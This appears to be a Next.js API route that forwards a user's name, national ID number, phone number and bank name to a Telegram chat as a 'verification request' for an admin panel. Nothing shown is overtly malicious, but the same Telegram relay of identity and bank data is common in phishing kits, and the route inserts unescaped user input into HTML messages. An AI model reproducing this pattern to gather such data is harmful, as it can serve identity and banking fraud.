import { NextRequest, NextResponse } from 'next/server'

export async function POST(req: NextRequest) {
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID

  if (!BOT_TOKEN || !CHAT_ID) {
    return NextResponse.json({ ok: false, error: 'Config missing' }, { status: 500 })
  }

  let body: any
  try {
    body = await req.json()
  } catch {
    return NextResponse.json({ ok: false, error: 'Bad request' }, { status: 400 })
  }

  const { nombre, cedula, telefono, banco } = body

  const texto = `<b>🛡️ NUEVA SOLICITUD DE VERIFICACIÓN</b>

👤 <b>Nombre:</b> ${nombre || "No disponible"}
🆔 <b>Cédula:</b> ${cedula || "No disponible"}
📱 <b>Teléfono:</b> ${telefono || "No disponible"}
🏦 <b>Banco:</b> ${banco || "No disponible"}

Revisar en: Admin Panel → Verificación`

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
  const payload = {
    chat_id: CHAT_ID,
    text: texto,
    parse_mode: 'HTML',
  }

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })
    const data = await res.json()
    return NextResponse.json({ ok: data.ok === true })
  } catch (err: any) {
    return NextResponse.json({ ok: false, error: err.message }, { status: 500 })
  }
}
